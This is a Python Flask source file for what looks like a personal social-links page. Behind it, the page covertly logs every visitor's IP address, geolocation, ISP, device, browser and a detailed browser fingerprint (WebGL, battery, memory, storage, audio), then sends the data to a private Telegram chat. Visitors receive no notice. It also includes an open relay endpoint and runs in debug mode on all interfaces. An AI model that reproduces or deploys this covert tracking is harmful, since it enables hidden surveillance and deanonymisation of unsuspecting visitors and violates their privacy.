# Хули ты че-то там читаешь

from flask import Flask, render_template, make_response, request, g, jsonify
from security_headers import register_security_headers
from dotenv import load_dotenv
import requests
import os
import time
import uuid
import httpagentparser
import hashlib
import json
import socket

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

screen_cache = {}
SCREEN_CACHE_TTL = 5

active_visitors = {}
SESSION_TTL = 300

message_cache = {}
MESSAGE_CACHE_TTL = 60


def check_internet_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False


def check_telegram_connection():
    try:
        response = requests.get("https://api.telegram.org", timeout=5)
        return response.status_code == 200
    except:
        return False


def _clean_message_cache():
    current_time = time.time()
    expired_hashes = [
        msg_hash for msg_hash, timestamp in message_cache.items()
        if current_time - timestamp > MESSAGE_CACHE_TTL
    ]
    for msg_hash in expired_hashes:
        del message_cache[msg_hash]


def send_telegram_message(text: str):
    if not BOT_TOKEN or not CHAT_ID:
        return False

    if not check_internet_connection():
        return False

    if not check_telegram_connection():
        return False

    message_hash = hashlib.md5(text.encode()).hexdigest()
    current_time = time.time()

    if message_hash in message_cache:
        if current_time - message_cache[message_hash] < MESSAGE_CACHE_TTL:
            return False

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}

    try:
        response = requests.post(url, json=payload, timeout=15)
        if response.status_code == 200:
            message_cache[message_hash] = current_time
            _clean_message_cache()
            return True
        else:
            return False
    except:
        return False


def get_battery_info(battery_level, battery_charging):
    if battery_level is None:
        return "Неизвестно"
    try:
        level_percent = float(battery_level) * 100
        charging_status = "⚡ Заряжается" if battery_charging else "🔋 Разряжается"
        return f"{level_percent:.0f}% ({charging_status})"
    except:
        return "Ошибка данных"


def detect_os(user_agent: str):
    ua = user_agent.lower()
    if "windows" in ua:
        return "Windows"
    if "mac os" in ua or "macintosh" in ua:
        return "macOS"
    if "android" in ua:
        return "Android"
    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "iOS"
    if "linux" in ua and "android" not in ua:
        return "Linux"
    return "Unknown"


def detect_device_model(user_agent: str):
    ua = user_agent.lower()
    if "android" in ua:
        try:
            start = ua.find("build")
            if start != -1:
                model_raw = ua[:start].split(";")[-1].strip()
                return model_raw.upper()
        except:
            pass
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    return "Неизвестно"


def detect_cpu_from_ua(user_agent: str):
    ua = user_agent.lower()
    if "arm" in ua or "aarch64" in ua:
        return "ARM"
    if "intel" in ua or "x86_64" in ua or "wow64" in ua or "win64" in ua:
        return "x86_64/Intel"
    if "amd" in ua:
        return "AMD"
    return "Неизвестно"


def build_server_fingerprint(parts: dict):
    s = json.dumps(parts, sort_keys=True, ensure_ascii=False)
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def get_geo_info(ip: str):
    local_ips = [
        '127.0.0.1', 'localhost', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
        '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
        '172.28.', '172.29.', '172.30.', '172.31.'
    ]

    if any(ip.startswith(prefix) for prefix in local_ips):
        return "Локальная сеть", "Локальная сеть", "Локальная сеть", "🏠"

    city, isp, country, country_emoji = "Неизвестно", "Неизвестно", "Неизвестно", "🏳️"

    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}?lang=ru", timeout=3).json()
        if geo.get("status") == "success":
            city = geo.get("city", city)
            isp = geo.get("isp", isp)
            country = geo.get("country", country)
            cc = geo.get("countryCode", "").upper()
            if len(cc) == 2:
                country_emoji = chr(127397 + ord(cc[0])) + chr(127397 + ord(cc[1]))
    except:
        pass

    return city, isp, country, country_emoji


def format_enhanced_data(enhanced_data):
    if not enhanced_data:
        return ""

    try:
        device_info = enhanced_data.get('deviceInfo', {})
        screen_info = enhanced_data.get('screenInfo', {})
        webgl_info = enhanced_data.get('webglInfo', {})
        audio_info = enhanced_data.get('audioInfo', {})
        network_info = enhanced_data.get('networkInfo', {})
        performance_info = enhanced_data.get('performanceInfo', {})
        storage_info = enhanced_data.get('storageInfo', {})

        formatted = "\n\n🔍 <b>РАСШИРЕННЫЕ ДАННЫЕ:</b>\n"

        formatted += f"📱 <b>Устройство:</b>\n"
        formatted += f"   • Платформа: {device_info.get('platform', 'Неизвестно')}\n"
        formatted += f"   • Вендор: {device_info.get('vendor', 'Неизвестно')}\n"
        formatted += f"   • Языки: {', '.join(device_info.get('languages', []))}\n"
        formatted += f"   • Тач-поинты: {device_info.get('maxTouchPoints', 0)}\n"

        formatted += f"📺 <b>Экран:</b>\n"
        formatted += f"   • Доступно: {screen_info.get('availWidth')}x{screen_info.get('availHeight')}\n"
        formatted += f"   • Глубина цвета: {screen_info.get('colorDepth')}bit\n"
        formatted += f"   • Ориентация: {screen_info.get('orientation', {}).get('type', 'unknown')}\n"
        formatted += f"   • Окно: {screen_info.get('innerWidth')}x{screen_info.get('innerHeight')}\n"

        if webgl_info.get('supported'):
            formatted += f"🎮 <b>Графика:</b>\n"
            formatted += f"   • WebGL: {webgl_info.get('vendor', 'Неизвестно')}\n"
            formatted += f"   • Рендерер: {webgl_info.get('renderer', 'Неизвестно')}\n"
            formatted += f"   • Расширения: {len(webgl_info.get('extensions', []))}\n"

        if network_info.get('connection'):
            conn = network_info['connection']
            formatted += f"🌐 <b>Сеть:</b>\n"
            formatted += f"   • Тип: {conn.get('effectiveType', 'Неизвестно')}\n"
            formatted += f"   • Скорость: {conn.get('downlink', 'Неизвестно')} Мбит/с\n"
            formatted += f"   • RTT: {conn.get('rtt', 'Неизвестно')}мс\n"

        if performance_info:
            formatted += f"⚡ <b>Производительность:</b>\n"
            formatted += f"   • FPS: {performance_info.get('fps', 'Неизвестно')}\n"
            if performance_info.get('memory'):
                mem = performance_info['memory']
                formatted += f"   • Память: {mem.get('usedJSHeapSize', 0)}/{mem.get('totalJSHeapSize', 0)}MB\n"

        if storage_info:
            formatted += f"💾 <b>Хранилища:</b>\n"
            formatted += f"   • LocalStorage: {storage_info.get('localStorage', {}).get('length', 0)} записей\n"
            formatted += f"   • Cookies: {storage_info.get('cookies', 0)} шт\n"
            if storage_info.get('indexedDB'):
                formatted += f"   • IndexedDB: {len(storage_info['indexedDB'].get('databaseNames', []))} БД\n"

        if audio_info.get('webAudioSupported'):
            formatted += f"🎵 <b>Аудио:</b>\n"
            formatted += f"   • Устройств: {len(audio_info.get('mediaDevices', []))}\n"
            formatted += f"   • Фингерпринт: {audio_info.get('audioFingerprint', 'Неизвестно')[:20]}...\n"

        return formatted
    except:
        return ""


@app.before_request
def log_visitor():
    path = request.path
    if path.startswith("/static") or path in ["/favicon.ico", "/robots.txt", "/sitemap.xml", "/log", "/screen_info"]:
        return

    ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw
    user_agent = request.headers.get("User-Agent", "Неизвестно")
    now = time.time()
    visitor_id = request.cookies.get("visitor_id")

    is_new_visit = False

    if not visitor_id:
        is_new_visit = True
        visitor_id = str(uuid.uuid4())
    elif visitor_id not in active_visitors:
        is_new_visit = True
    else:
        last_time = active_visitors[visitor_id]["time"]
        if now - last_time > SESSION_TTL:
            is_new_visit = True
        else:
            if active_visitors[visitor_id].get("logged"):
                active_visitors[visitor_id]["time"] = now
                return
            active_visitors[visitor_id]["time"] = now

    if is_new_visit:
        active_visitors[visitor_id] = {"ip": ip, "time": now, "logged": False}

    city, isp, country, country_emoji = get_geo_info(ip)
    os_name = detect_os(user_agent)
    device_model = detect_device_model(user_agent)
    parsed = httpagentparser.simple_detect(user_agent)
    browser_name = parsed[1] if parsed and parsed[1] else "Неизвестно"
    browser_language = request.headers.get("Accept-Language", "Неизвестно").split(',')[0].split(';')[0].strip() if request.headers.get("Accept-Language") else "Неизвестно"
    protocol = "HTTPS" if request.is_secure else "HTTP"
    domain = request.headers.get("Host", "Неизвестно")

    resolution = "Неизвестно"
    scale = "Неизвестно"

    if ip in screen_cache:
        entry = screen_cache[ip]
        if now - entry["time"] < SCREEN_CACHE_TTL:
            resolution = entry.get("resolution", resolution)
            scale = entry.get("scale", scale)

    cpu_guess = detect_cpu_from_ua(user_agent)
    gpu_guess = "Неизвестно"

    base_message = (
        f"📡 IP: {ip}\n"
        f"🏙️ Город: {city}\n"
        f"{country_emoji} Страна: {country}\n"
        f"🛜 Провайдер: {isp}\n"
        f"🖥 ОС: {os_name}\n"
        f"📱 Модель устройства: {device_model}\n"
        f"⚙️ CPU (по UA): {cpu_guess}\n"
        f"🖧 GPU (по UA): {gpu_guess}\n"
        f"🌐 Браузер: {browser_name}\n"
        f"🗣️ Язык браузера: {browser_language}\n"
        f"🔒 Протокол: {protocol}\n"
        f"🌐 Домен: {domain}\n"
        f"📺 Разрешение экрана: {resolution}\n"
        f"⚖️ Масштаб: {scale}\n"
        f"📍 Страница: {path}\n"
    )

    active_visitors[visitor_id]["base_message"] = base_message
    active_visitors[visitor_id]["logged"] = True
    g.new_visitor_id = visitor_id


@app.after_request
def set_cookie_and_remove_server_header(response):
    if hasattr(g, "new_visitor_id"):
        response.set_cookie("visitor_id", g.new_visitor_id, max_age=SESSION_TTL)

    if "Server" in response.headers:
        response.headers.pop("Server")

    if hasattr(response, "environ") and "SERVER_SOFTWARE" in response.environ:
        response.environ["SERVER_SOFTWARE"] = ""

    return response


register_security_headers(app)


@app.route("/")
def index():
    bio = {
        "nickname": "JIARBUZ",
        "links": [
            {"name": "Telegram", "url": "tg://resolve?domain=O3EPO_KP0Bl", "icon": "fa-brands fa-telegram"},
            {"name": "GitHub", "url": "https://github.com/jiarbuz", "icon": "fa-brands fa-github"},
            {"name": "Steam", "url": "https://steamcommunity.com/id/jiarbuz", "icon": "fa-brands fa-steam"},
            {"name": "LolzTeam", "url": "https://lolz.live/members/4265472/", "icon": "fa-solid fa-eye"},
            {"name": "Roblox", "url": "https://www.roblox.com/users/577295282/profile", "icon": "fa-solid fa-cube"},
            {"name": "VK", "url": "https://vk.com/arbuzji228", "icon": "fa-brands fa-vk"},
            {"name": "YouTube", "url": "https://www.youtube.com/@jiarbuz", "icon": "fa-brands fa-youtube"},
            {"name": "TikTok", "url": "https://www.tiktok.com/@jiarbuz", "icon": "fa-brands fa-tiktok"},
            {"name": "Discord", "url": "https://discord.com/users/971767339282497536", "icon": "fa-brands fa-discord"},
            {"name": "Twitch", "url": "https://www.twitch.tv/jiarbuz228", "icon": "fa-brands fa-twitch"},
            {"name": "Reddit", "url": "https://www.reddit.com/user/jiaruz/", "icon": "fa-brands fa-reddit-alien"},
            {"name": "Donate", "url": "https://yoomoney.ru/fundraise/1B54G3B36G9.250627", "icon": "fa-solid fa-hand-holding-heart"}
        ]
    }
    response = make_response(render_template("index.html", bio=bio))
    return response


@app.route("/screen_info", methods=["POST"])
def screen_info():
    try:
        data = request.get_json(silent=True)
        if not data:
            return {"error": "No data provided"}, 400

        visitor_id = request.cookies.get("visitor_id")
        if not visitor_id:
            return {"error": "No visitor session"}, 400

        if visitor_id in active_visitors and "base_message" in active_visitors[visitor_id]:
            base_message = active_visitors[visitor_id]["base_message"]
        else:
            ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
            ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw
            user_agent = request.headers.get("User-Agent", "Неизвестно")
            os_name = detect_os(user_agent)

            base_message = (
                f"📡 IP: {ip}\n"
                f"🖥 ОС: {os_name}\n"
                f"📍 Страница: /\n"
            )

        width = data.get("width")
        height = data.get("height")
        scale = data.get("scale", 1.0)
        webgl_vendor = data.get("webgl_vendor", "Неизвестно")
        webgl_renderer = data.get("webgl_renderer", "Неизвестно")
        hardware_concurrency = data.get("hardwareConcurrency", "Неизвестно")
        device_memory = data.get("deviceMemory", "Неизвестно")
        battery_level = data.get("battery_level", None)
        battery_charging = data.get("battery_charging", None)
        platform = data.get("platform", "Неизвестно")
        timezone = data.get("timezone", "Неизвестно")
        language = data.get("language", "Неизвестно")
        plugins = data.get("plugins", "Неизвестно")
        client_fingerprint = data.get("fingerprint", None)

        enhanced_data = data.get("enhancedData")

        ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
        ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw

        screen_res = "Неизвестно"
        if width and height:
            screen_res = f"{width}x{height}"
            screen_cache[ip] = {"resolution": screen_res, "scale": str(scale), "time": time.time()}

        battery_info = get_battery_info(battery_level, battery_charging)

        enhanced_info = format_enhanced_data(enhanced_data)

        full_message = (
            f"{base_message}"
            f"⚙️ CPU ядер: {hardware_concurrency}\n"
            f"💾 Оперативная память: {device_memory} GB\n"
            f"🔋 Батарея: {battery_info}\n"
            f"🖧 GPU (WebGL): {webgl_renderer}\n"
            f"🔧 WebGL вендор: {webgl_vendor}\n"
            f"🌐 Платформа: {platform}\n"
            f"⏰ Часовой пояс: {timezone}\n"
            f"🗣️ Язык системы: {language}\n"
            f"🔌 Плагины: {plugins}\n"
            f"🔑 Fingerprint: {client_fingerprint or 'Неизвестно'}\n"
            f"{enhanced_info}"
        )

        if send_telegram_message(full_message):
            return jsonify({"status": "success"}), 200
        else:
            try:
                with open("enhanced_messages.log", "a", encoding="utf-8") as f:
                    f.write(f"=== {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                    f.write(full_message)
                    f.write("\n\n")
            except:
                pass
            return jsonify({"status": "failed"}), 500

    except:
        return {"error": "Internal error"}, 500


@app.route("/log", methods=["POST"])
def log():
    data = request.get_json(silent=True)
    message = data.get("message") if data else None
    if not message:
        return {"error": "No message provided"}, 400
    try:
        if send_telegram_message(message):
            return {"status": "ok"}, 200
        else:
            return {"error": "Message not sent (duplicate or error)"}, 400
    except:
        return {"error": "Internal error"}, 500


@app.route("/robots.txt")
def robots():
    resp = make_response("User-agent: *\nDisallow:\nSitemap: /sitemap.xml")
    resp.headers["Content-Type"] = "text/plain"
    return resp


@app.route("/sitemap.xml")
def sitemap():
    xml = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://127.0.0.1:5000/</loc></url>
</urlset>"""
    resp = make_response(xml)
    resp.headers["Content-Type"] = "application/xml"
    return resp


@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok"}), 200


if __name__ == "__main__":
    check_internet_connection()
    check_telegram_connection()

    cert_path = os.path.join(os.getcwd(), "certs", "cert.pem")
    key_path = os.path.join(os.getcwd(), "certs", "key.pem")
    if os.path.exists(cert_path) and os.path.exists(key_path):
        app.run(host="0.0.0.0", port=5000, ssl_context=(cert_path, key_path), debug=True)
    else:
        app.run(host="0.0.0.0", port=5000, debug=True)